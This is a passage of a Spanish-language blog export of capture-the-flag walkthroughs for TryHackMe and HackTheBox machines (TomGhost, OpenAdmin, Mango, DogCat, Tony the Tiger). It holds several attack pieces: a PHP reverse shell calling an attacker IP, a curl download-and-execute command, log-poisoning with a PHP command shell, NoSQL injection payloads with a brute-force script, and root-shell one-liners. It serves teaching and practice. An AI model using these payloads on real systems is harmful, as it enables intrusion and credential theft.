4ubuntu2.8 (Ubuntu Linux; protocol 2.0) 53/tcp open tcpwrapped 8009/tcp open ajp13 Apache Jserv (Protocol v1.3) 8080/tcp open http Apache Tomcat 9.0.30 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon May 4 21:55:31 2020 -- 1 IP address (1 host up) scanned in 28.22 seconds GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 root@upset:~/thm/tomghost# gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://tomgost.thm:8080/ -q -t 25 -x php,html,txt /docs (Status: 302) /examples (Status: 302) /favicon.ico (Status: 200) /host-manager (Status: 302) /manager (Status: 302) root@upset:~/thm/tomghost# HTTP Puerto 8080 Encontramos Apache Tompact en el puerto 8080.\nAJP - Ghostcat File Read/Inclusion Para el servicio en el puerto 8009 (Apache Jserv) encontramos un exploit que permite lectura de archivos, utilizamos el exploit CVE-2020-1938. Intentamos leer el archivo index.jsp y logramos obtener el codigo fuente.\nYa que logramos obtener el codigo fuente de index.jsp, intentamos obtener el archivo de configuracion web.xml, logramos obtener el codigo fuente y logramos ver lo que parecen credenciales.\nUSER - SKYFUCK Intentamos ingresar en el panel de tomcat (/manager/html) pero no esta autorizado el acceso. Utilizamos el servicio SSH con las credenciales encontradas y logramos obtener una shell.\nDentro de la carpeta principal de Skyfuck encontramos dos arhivos una clave y un archivo encriptado, intentamos importar la key y desencriptar el archivo gpg pero al parecer la clave esta protegida por una frase.\nUtilizamos gpg2john para generar el hash y utilizar john para encontrar la frase.\nUna vez encontrada la frase utilizamos esta para desencriptar el archivo credentials.gpg.\nUSER - MERLIN Utilizamos las credenciales encontradas y obtenemos una shell con el usuario merlin y nuestra flag user.txt.\nPRIVILEGE ESCALATION Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando zip. Utilizamos zip para obtener una shell root.\nLogramos obtener una shell con usuario root y nuestra flag root.txt.\n","description":"TomGhost es una maquina de TryHackMe. Identificamos una vulnerabilidad en Tomcat para leer las credenciales de esta misma plataforma, lo que nos permitio acceder por SSH donde luego encontramos un archivo encriptado y, que, con la ayuda de John obtuvimos la contraseña para un segundo usuario. Escalamos privilegios utilizando Sudo con Zp e informacion de GTFOBins.","id":143,"section":"posts","tags":["Ghostcat"],"title":"TryHackMe - TomGhost","uri":"https://sckull.github.io/posts/tomgost/"},{"content":"\rOpenAdmin es una maquina de HackTheBox donde encontramos una vulnerabilidad RCE en OpenNetAdmin que aprovechamos para ejecutar una shell inversa. Accedimos al siguiente usuario con contraseñas almacenadas. Tras analizar el codigo fuente de una pagina, ejecutamos un Tunnel para obtener esta localmente y finalmente obtener una clave privada para acceder a otro usuario por SSH. Escalamos privilegios utilizando Nano e informacion de GTFOBins.\nInformacion de la Maquina Nombre OpenAdmin OS Linux Puntos 20 Dificultad Facil IP 10.10.10.171 Maker del_KZx497Ju\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.8, 5.1, 7.1, 2.9, 4.9],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puertos tcp y servicios con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-08 05:54:56 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.171 Discovered open port 80/tcp on 10.10.10.171 # Nmap 7.80 scan initiated Tue Jan 7 23:51:39 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.171 Warning: 10.10.10.171 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.171 Host is up (0.15s latency). Not shown: 65528 closed ports PORT STATE SERVICE VERSION 22/tcp open tcpwrapped | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works 16874/tcp filtered unknown 31545/tcp filtered unknown 40838/tcp filtered unknown 42307/tcp filtered unknown 47055/tcp filtered unknown Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Jan 7 23:53:43 2020 -- 1 IP address (1 host up) scanned in 123.98 seconds HTTP Pagina por default de Apache.\nGOBUSTER - HTTP Busqueda de directorios y archivos con gobuster.\n1 2 3 4 5 6 root@aoiri:~/htb/openadmin# gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 115 -x php,html,txt -q /index.html (Status: 200) /music (Status: 301) /artwork (Status: 301) /sierra (Status: 301) /marga (Status: 301) /music /sierra /marga /artwork OpenNetAdmin 18.1.1 - RCE En la pagina de /music encontramos que la pagina login nos redirige hacia otra pagina diferente (/ona), en la cual esta corriendo el gestor OpenNetAdmin en su version 18.1.1.\nEste gestor tiene una vulnerabilidad del tipo RCE y encontramos un exploit (OpenNetAdmi - ExploitDB ) que aprovecha esta vulnerabilidad, ejecutamos dicho exploit pasandole la url como parametro.\nUSER - Jimmy Ahora que podemos ejecutar comandos vamos a actualizar nuestra shell a una shell inversa utilizando PHP, descargando el archivo y abriendolo en el navegador para ejecutarlo.\n1 \u0026lt;?php exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.15.72/1227 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); Descargamos en la maquina:\n1 wget 10.10.15.72/sc.php Obtenemos nuestra shell inversa:\nEntre los archivos de configuracion de la base de datos de OpenNetAdmin encontramos las credenciales para acceder a la base de datos, utilizamos la contraseña para obtener una shell con el usuario Jimmy.\nJimmy:\nCredenciales:\njimmy:n1nj4W4rri0R! USER - Joanna Dentro de la carpeta /var/www/ donde usualmente se encuentran las paginas de apache, vemos que jimmy tiene permisos en una de las carpetas.\nCambiamos nuestra shell a SSH con el usuario Jimmy para poder enumerar los archivos dentro de la carpeta /home y /var/www.\nEn la carpeta principal de Jimmy encontramos un archivo PHP - post.php el cual hace una solicitud con curl (en PHP) enviando un usuario y contraseña y obtiene el resultado de la solicitud.\nAl ejecutarlo nos muestra un error:\nPero la solicitud la hace hacia el localhost de la maquina en un puerto que no es publico.\nEn /var/www/internal, vemos que en archivo index.php existe una contraseña encriptada.\nCon la ayuda de crackstation logramos obtener en texto plano la contraseña:\nCredenciales:\njimmy:Revealed Ahora que conocemos todo esto, traemos localmente el puerto 52846 utilizando SSH, visitamos la pagina y nos muestra un panel de logeo.\nSSH:\n1 ssh -L 8080:localhost:52846 jimmy@10.10.10.171 Netstat:\nPanel:\nIngresamos las credenciales que obtuvimos en el archivo index, y nos muestra una clave privada de SSH encryptada.\nUtilizamos john the ripper para crackear la frase e iniciar sesion con la clave privada.\nFrase:bloodninjas SSH Joanna:\nObtenemos una shell y nuestra flag user.txt.\nPRIVILEGE ESCALATION Utilizamos sudo para ver los comandos que podemos utilizar sin contraseña, vemos que nano es uno de ellos, con la ayuda de GTFOBbins - nano obtenemos una shell commo root y con ello nuestra flag root.txt.\nBTW Podemos agregar nuestra clave publica al archivo authorized_keys del usuario root e iniciar sesion con nuestra clave privada.\n","description":"OpenAdmin es una maquina de HackTheBox donde encontramos una vulnerabilidad RCE en OpenNetAdmin que aprovechamos para ejecutar una shell inversa. Accedimos al siguiente usuario con contraseñas almacenadas. Tras analizar el codigo fuente de una pagina, ejecutamos un Tunnel para obtener esta localmente y finalmente obtener una clave privada para acceder a otro usuario por SSH. Escalamos privilegios utilizando Nano e informacion de GTFOBins.","id":144,"section":"posts","tags":["OpenNetAdmin","nano"],"title":"Hack The Box - OpenAdmin","uri":"https://sckull.github.io/posts/openadmin/"},{"content":"\rDescubrimos un subdominio tras ejecutar SSLScan lo que nos llevo a una vulnerabilidad de Inyeccion NoSQL en donde obtuvimos credenciales que utilizamos en el servicio SSH. Enumeramos los ficheros SUID donde encontramos jjs de java que aprovechamos para escalar privilegios.\nInformacion de la Maquina Nombre Mango OS Linux Puntos 30 Dificultad Media IP 10.10.10.162 Maker MrR3boot\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.4, 7.2, 5.2, 4.8, 2.8],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[7, 9, 4, 6, 1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y servicios con masscan y nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 root@aoiri:~/htb/mango# masscan -p1-65535,U:1-65535 10.10.10.162 --rate=1000 -e tun0 Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2019-12-31 00:09:30 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 80/tcp on 10.10.10.162 Discovered open port 22/tcp on 10.10.10.162 # Nmap 7.80 scan initiated Mon Dec 30 17:45:13 2019 as: nmap -p- --min-rate 1000 -o nmap_scan 10.10.10.162 Warning: 10.10.10.162 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.162 Host is up (0.34s latency). Not shown: 65531 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https 45463/tcp filtered unknown # Nmap done at Mon Dec 30 17:46:57 2019 -- 1 IP address (1 host up) scanned in 103.79 seconds # Nmap 7.80 scan initiated Mon Dec 30 18:09:24 2019 as: nmap -sV -sC -p22,80,443,45436 -o nmap_scan_sc 10.10.10.162 Nmap scan report for 10.10.10.162 Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA) | 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA) |_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: 400 Bad Request | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN | Not valid before: 2019-09-27T14:21:19 |_Not valid after: 2020-09-26T14:21:19 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 45436/tcp closed unknown Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Dec 30 18:09:56 2019 -- 1 IP address (1 host up) scanned in 32.05 seconds HTTP Al visitar el puerto 80 nos muestra que no tenemos permisos para ver el contenido.\nGOBUSTER Busqueda de directorios y archivos con gobuster.\n1 2 root@aoiri:~/htb/mango# gobuster dir -u http://10.10.10.162/ -w /usr/share/wordlists/dirb/common_nofirst10.txt -t 15 -q -x php,html,txt /server-status (Status: 403) HTTPS En el puerto 443, nos muestra una pagina tipo buscador.\nGOBUSTER - HTTPS Busqueda de directorios y archivos con gobuster.\n1 2 3 4 5 root@aoiri:~/htb/mango# gobuster dir -u https://10.10.10.162/ -w /usr/share/wordlists/dirb/common.txt -t 35 -q -x php,html,txt -k /analytics.php (Status: 200) /index.php (Status: 200) /index.php (Status: 200) /server-status (Status: 403) /analytics.php Encontramos una pagina con una funcionalidad de tabla de \u0026rsquo;excel\u0026rsquo;.\nSSLSCAN Utilizamos sslscan para verificar el certificado de la pagina, encontramos un dominio el cual agregamos a /etc/hosts.\nVisitamos la pagina del dominio nuevo (https) pero nos muestra la misma pagina que la ip en https, pero no muestra lo mismo en http.\nNuevamente ejecutamos gobuster pero no encontramos nada interesante en los directorios.\n1 2 3 4 5 6 root@aoiri:~/htb/mango# gobuster dir -u http://staging-order.mango.htb/ -w /usr/share/wordlists/dirb/common.txt -q -x txt,html,php -t 15 /home.php (Status: 302) /index.php (Status: 200) /index.php (Status: 200) /server-status (Status: 403) /vendor (Status: 301) USER - MongoDB NoSQL Capturamos los datos que se envian al iniciar sesion en el panel intentando encontrar una vulnerabilidad del tipo sql injection, pero ninguno de los parametros era vulnerable. Intentamos con NoSQL Injection dentro de burpsuite:\nParametros:\nusername[$ne]=sckull\u0026amp;password[$ne]=sckull\u0026amp;login=login Inyeccion NoSQL - Burpsuite Utilizamos burpsuite para obtener la contraseña y longitud de ella del usuario mango (asumiendo que mango es un usuario), para conocer la longitud de la contraseña utilizamos el payload, reemplazando el numero 0 por un numero mayor hasta que el resultado de la solicitud sea 200, en el caso del usuario mango la longitud de la contraseña puede ser \u0026gt;= 16 caracteres:\n1 username=mango\u0026amp;password[$regex]=.{16}\u0026amp;login=login Utilizando el siguiente payload donde el 0 es reemplazado por otro hasta que la respuesta de nuestra solicitud sea Codigo 302 que significa que la expresion regular que le estamos pasando esta haciendo match con la contraseña:\nusername=mango\u0026amp;password[$regex]=^0\u0026amp;login=login Vemos que el inicio de la contraseña es h:\nModificamos nuevamente nuestro parametro en password:\nusername=mango\u0026amp;password[$regex]=^h§0§\u0026amp;login=login Haciendo el mismo procedimiento cada vez que encontremos una solicitud 302, hasta obtener la contraseña completa:\nmango:h3mXK8RhU~f{]f5H Tambien podemos utilizar el script que PayloadAllTheThings tiene en NoSQL Injection, modificando un poco el codigo para adaptarlo a esta maquina quedaria de esta forma:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import requests import urllib3 import string import urllib urllib3.disable_warnings() #username=\u0026#34;mango\u0026#34; password=\u0026#34;\u0026#34; u=\u0026#34;http://staging-order.mango.htb/index.php\u0026#34; headers = {\u0026#39;application\u0026#39; : \u0026#39;x-www-form-urlencoded\u0026#39;} while True: for c in string.printable: if c not in [\u0026#39;*\u0026#39;,\u0026#39;+\u0026#39;,\u0026#39;.\u0026#39;,\u0026#39;?\u0026#39;,\u0026#39;|\u0026#39;]: payload={\u0026#39;username[$eq]\u0026#39;:\u0026#39;mango\u0026#39;, \u0026#39;password[$regex]\u0026#39;: \u0026#39;^%s\u0026#39; %(password + c), \u0026#39;login\u0026#39;: \u0026#39;login\u0026#39; } #print payload r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False) if r.status_code == 302: #print \u0026#34;For check the payload ...\u0026#34; #print payload print(\u0026#34;Found one more char : %s\u0026#34; % (password+c)) password += c Obtuvimos la contraseña del usuario mongo pero no pudimos iniciar sesion en el panel, nos redirige al index, utilizamos las credenciales en el servicio ssh y logramos obtener una shell.\nDentro de los servicios de la maquina encontramos que esta corriendo mongo en el puerto 27017.\nUtilizando la shell de mongo pudimos obtener las credenciales del usuario admin.\nCambiamos de usuario y obtuvimos nuestra flag user.txt.\nPRIVILEGE ESCALATION Enumeramos los ficheros SUID para tomar ventaja de estos, encontramos que existe en la maquina jjs, utilizamos GTFOBINS para obtener una shell. Modificamos sh por bash, ya que nos da un error al intentar ejecutar comandos.\n1 echo \u0026#34;Java.type(\u0026#39;java.lang.Runtime\u0026#39;).getRuntime().exec(\u0026#39;/bin/bash -pc \\$@|bash\\${IFS}-p _ echo bash -p \u0026lt;$(tty) \u0026gt;$(tty) 2\u0026gt;$(tty)\u0026#39;).waitFor()\u0026#34; | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs Obtuvimos nuestra shell con privilegios root y nuestra flag root.txt.\n","description":"Descubrimos un subdominio tras ejecutar SSLScan lo que nos llevo a una vulnerabilidad de Inyeccion NoSQL en donde obtuvimos credenciales que utilizamos en el servicio SSH. Enumeramos los ficheros SUID donde encontramos jjs de java que aprovechamos para escalar privilegios.","id":145,"section":"posts","tags":["noSQL","sslscan","suid"],"title":"Hack The Box - Mango","uri":"https://sckull.github.io/posts/mango/"},{"content":"\rDogCat es una maquina de TryHackMe, explotando la vulnerabilidad LFI con wrappers de PHP obtuvimos la primera flag. Realizando Log Poisoning obtuvimos una shell. Escalamos privilegios utilizando ENV y Sudo en contenedor de Docker. Un script ejecutado por un CronJob del Host permitio escalar privilegios.\nRoom Titulo dogcat Descripción I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container. Puntos 435 Dificultad Media Maker jammy NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (445) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # Nmap 7.80 scan initiated Fri Apr 17 20:42:19 2020 as: nmap -T5 -sV -sC -p- -o nmap_scan dogcat.thm Warning: dogcat.thm giving up on port because retransmission cap hit (2). Nmap scan report for dogcat.thm Host is up (0.15s latency). Not shown: 65497 closed ports, 36 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA) | 256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA) |_ 256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: dogcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Apr 17 20:52:58 2020 -- 1 IP address (1 host up) scanned in 639.73 seconds GOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 root@upset:~/tools/Kadimus# gobuster dir -u http://dogcat.thm/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -q -t 45 -x php,html,txt /index.php (Status: 200) /cat.php (Status: 200) /flag.php (Status: 200) /cats (Status: 301) /dogs (Status: 301) /dog.php (Status: 200) HTTP Encontramos una pagina sencilla en el puerto 80, que al darle click a la opcion de perro (dog) nos muestra una imagen.\nVemos que en la url le pasa por parametro la palabra dog. Dentro del escaneo de GOBUSTER vimos que existe un archivo cat y dog con extension en php, al ver el codigo fuente de ambas paginas y al recargar por repetidas ocaciones la imagen que genera junto al codigo html es distinta.\nPor lo que cada vez que se selecciona la opcion de dog o cat, nos muéstra distintas imagenes.\nLFI - CAT OR DOG Intentamos utilizar LFI basico (/etc/passwd, /var/log/apache2/access.log, etc) pero no logramos leer ninguno de los archivos ya que la pagina nos mostraba el mensaje Sorry, only dogs or cats are allowed..\nLo curioso de este reto es que, al pasarle la palabra cat dentro de una peticion de un archivo o lo que fuera, nos mostraba el mensaje Here you go! y un error de la funcion include(). Desde aqui tiene un poco de sentido el mensaje de error anterior (Sorry, only dogs or cats are allowed.) podemos utilizar tanto dog o cat dentro de las peticiones para que sean aceptadas.\nUtilizamos php://filter/convert.base64-encode/dog/resource=ARCHIVO para leer archivos, en este caso leemos el archivo index.php que es el que utiliza ?view=, logramos obtener el archivo en base64.\nLogramos obtener el codigo fuente de index.php, logramos ver que hay una funcion que verifica si existe cat o dog dentro de la peticion, tambien vemos que podemos enviarle como parametro una extension de lo contrario la tomara como .php.\n**ALERTA DE SPOILER** `SPOILER` `SPOILER` `SPOILER`\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;?php function containsStr($str, $substr) { return strpos($str, $substr) !== false; } $ext = isset($_GET[\u0026#34;ext\u0026#34;]) ? $_GET[\u0026#34;ext\u0026#34;] : \u0026#39;.php\u0026#39;; if(isset($_GET[\u0026#39;view\u0026#39;])) { if(containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;dog\u0026#39;) || containsStr($_GET[\u0026#39;view\u0026#39;], \u0026#39;cat\u0026#39;)) { echo \u0026#39;Here you go!\u0026#39;; include $_GET[\u0026#39;view\u0026#39;] . $ext; } else { echo \u0026#39;Sorry, only dogs or cats are allowed.\u0026#39;; } } ?\u0026gt; Leemos el archivo flag.php y logramos leer nuestra primera flag.\nRCE - Apache Log Poisoning Utilizamos el User-Agent para poder ejecutar nuestro codigo php el que tendra como objetivo obtener y ejecutar un comando que le pasemos. Utilizamos php://filter/dog/resource=../../../../var/log/apache2/access.log\u0026amp;ext= para leer el archivo log, además de esto agregamos el comando que deseamos ejecutar en la maquina \u0026amp;cmd=whoami, por lo que luciría de la siguiente forma.\nApache Log Poisoning\n1 2 3 GET /?view=php://filter/dog/resource=../../../../var/log/apache2/access.log\u0026amp;ext=\u0026amp;cmd=whoami HTTP/1.1 Host: dogcat.thm User-Agent:Mozilla/5.0 \u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]); ?\u0026gt; Gecko/20100101 Firefox/68.0 Vemos que en la respuesta tenemos acceso como usuario www-data.\nUSER - WWW-DATA [ DOCKER ] Ahora, creamos un archivo que contenga una shell inversa para descargarlo mediante un servidor de python (python3 -m http.server 80) en la maquina.\nComando para descargar y ejecutar nuestra shell (Codificamos a URL los espacios)\n1 2 3 4 bash -c \u0026#34;$(curl -s 10.8.6.160/shell.sh)\u0026#34; #Codificado bash%20-c%20%20\u0026#34;$(curl%20-s%2010.8.6.160/shell.sh)\u0026#34; Logramos obtener una shell con el usuario www-data.\nNuestra segunda flag.\nPRIVILEGE ESCALATION - DOCKER Hacemos una pequeña enumeracion con sudo -l -l y vemos que tenemos permisos root (sudo) para ejecutar el comando env. Utilizamos env para obtener una shell root.\n1 sudo /usr/bin/env /bin/sh Òbtenemos nuestra shell como usuario root y nuestra tercera flag.\nESCAPING DOCKER Tenemos privilegio root pero vemos que estamos limitados de comandos y vemos en la raiz de la maquina que existe un archivo .dockerenv por lo que en el lugar que estamos es un contenedor.\nDentro de la carpeta /opt/backup encontramos una carpeta que contiene dos archivos un bash y un tar, los cuales se utilizaron para crear el contenedor (backup.tar), vemos que el archivo bash descomprimer el archivo tar dentro de /root/container. Agregamos un ping hacia nuestra maquina en el archivo y logramos obtener paquetes en tcpdump.\nTCPDUMP\nPodemos deducir que existe un crontab que ejecuta el archibo backup.sh, ahora, agregamos una shell inversa a este archivo y ponemos a la escucha netcat en nuestra maquina y esperamos a que nos devuelva una shell.\nSHELL\nNETCAT\nLogramos obtener una shell y nuestra ultima flag.\nCrontab del archivo backup.sh\n","description":"DogCat es una maquina de TryHackMe, explotando la vulnerabilidad LFI con wrappers de PHP obtuvimos la primera flag. Realizando Log Poisoning obtuvimos una shell. Escalamos privilegios utilizando ENV y Sudo en contenedor de Docker. Un script ejecutado por un CronJob del Host permitio escalar privilegios.","id":146,"section":"posts","tags":["lfi","cron","docker","lfi poisoning","wrappers"],"title":"TryHackMe - DogCat","uri":"https://sckull.github.io/posts/dogcat/"},{"content":"\rTony the Tiger es una maquina de TryHackMe, explotamos una vulnerabilidad en JBoss con JexBoss Tool para acceder a la maquina. Accedimos con un segundo usuario utilizando contraseñas almacenadas. Finalmente escalamos privilegios utilizando Find e informacion de GTFOBins.\nRoom Titulo Tony the Tiger Descripción Learn how to use a Java Serialisation attack in this boot-to-root Puntos 240 Dificultad Facil Maker cmnatic NMAP Escaneo de puertos tcp, escaneo con nmap muestra el puerto http (80), http (8080), el puerto ssh (22) abiertos, entre otros puertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 # Nmap 7.80 scan initiated Fri Apr 17 19:53:10 2020 as: nmap -sV -sC -o nmap_scan 10.10.91.15 Nmap scan report for 10.10.91.15 Host is up (0.20s latency). Not shown: 989 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a (DSA) | 2048 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f (RSA) | 256 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea (ECDSA) |_ 256 f6:36:07:3c:3b:3d:71:30:c4:cd:2a:13:00:b5:25:ae (ED25519) 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-generator: Hugo 0.66.0 |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Tony\u0026amp;#39;s Blog 1090/tcp open java-rmi Java RMI |_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug) 1091/tcp open java-rmi Java RMI 1098/tcp open java-rmi Java RMI 1099/tcp open java-object Java Object Serialization | fingerprint-strings: | NULL: | java.rmi.MarshalledObject| | hash[ | locBytest | objBytesq | #http://thm-java-deserial.home:8083/q | org.jnp.server.NamingServer_Stub | java.rmi.server.RemoteStub | java.rmi.server.RemoteObject | xpwA | UnicastRef2 |_ thm-java-deserial.home 4446/tcp open java-object Java Object Serialization 5500/tcp open hotline? | fingerprint-strings: | DNSStatusRequestTCP: | DIGEST-MD5 | NTLM | GSSAPI | CRAM-MD5 | thm-java-deserial | DNSVersionBindReqTCP: | DIGEST-MD5 | NTLM | CRAM-MD5 | GSSAPI | thm-java-deserial | GenericLines, NULL: | CRAM-MD5 | DIGEST-MD5 | GSSAPI | NTLM | thm-java-deserial | GetRequest: | NTLM | GSSAPI | DIGEST-MD5 | CRAM-MD5 | thm-java-deserial | HTTPOptions, TLSSessionReq: | DIGEST-MD5 | CRAM-MD5 | NTLM | GSSAPI | thm-java-deserial | Help: | NTLM | GSSAPI | CRAM-MD5 | DIGEST-MD5 | thm-java-deserial | Kerberos: | CRAM-MD5 | DIGEST-MD5 | NTLM | GSSAPI | thm-java-deserial | RPCCheck: | DIGEST-MD5 | CRAM-MD5 | GSSAPI | NTLM | thm-java-deserial | RTSPRequest: | CRAM-MD5 | 